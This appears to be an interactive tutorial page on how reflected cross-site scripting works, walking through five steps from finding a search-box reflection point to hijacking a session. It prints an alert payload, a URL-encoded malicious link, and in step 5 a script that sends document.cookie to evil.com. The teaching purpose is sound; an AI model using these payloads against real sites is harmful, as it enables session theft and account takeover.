How XSS Happens

🧠 The Core Idea

XSS happens in exactly one situation: a web application takes user input and writes it back to the page without checking it first. The browser then executes whatever it finds — including any attacker-supplied JavaScript.

💡

One sentence version: The browser can't tell the difference between the developer's JavaScript and the attacker's JavaScript — it runs them both.

🎬 The XSS Attack — Step by Step

Click through the five steps below to see exactly how a Reflected XSS attack unfolds between an attacker, a victim, and a vulnerable server.

Step 1 of 5 — Attacker Finds a Reflection Point
🔍 Step 1 — Attacker Finds a Reflection Point
The attacker visits a normal website and finds an input field — like a search box — where typed text appears directly on the page. This is called a reflection point: the server takes input and reflects it back in the HTML response.
→ Attacker types: laptop
→ Server returns: You searched for: laptop
— Page source shows: —
<p>You searched for: laptop</p>
⚗️ Step 2 — Attacker Crafts a Malicious Payload
Instead of a normal search term, the attacker tries injecting a <script> tag. If the server does not sanitize the input, the script tag will be included in the HTML response and executed by the browser.
→ Attacker types: <script>alert('XSS')</script>
→ Server returns:
<p>You searched for: <script>alert('XSS')</script></p>
⚠ The <script> tag is now part of the page's HTML
🔗 Step 3 — Attacker Sends the Malicious URL to a Victim
The attacker wraps the payload inside a URL and sends it to a victim — via email, chat, or social media. The URL looks like it belongs to the legitimate website, which makes it convincing.
— Malicious URL —
https://shop.example.com/search?q=%3Cscript%3Ealert%28%27XSS%27%29%3C%2Fscript%3E
The payload is URL-encoded — still executes when the browser decodes it
💀 Step 4 — Victim's Browser Executes the Script
The victim clicks the link. Their browser requests the page, receives the HTML with the embedded script, and executes it — in the context of the legitimate website. The victim sees the website as normal but their browser is running attacker code.
— What the browser receives and executes —
<html>
  <p>You searched for: <script>alert('XSS')</script></p>
</html>
🔥 Browser runs attacker's JavaScript — on the victim's machine
🍪 Step 5 — Attacker Steals Session Data
In a real attack, the payload doesn't just show an alert. It silently reads the victim's session cookie and sends it to the attacker's server. With that cookie, the attacker can log in as the victim — no password needed.
— Real-world payload —
<script>
  fetch('https://evil.com/steal?c=' + document.cookie);
</script>
🚨 Session hijacked. Victim never knows anything happened.
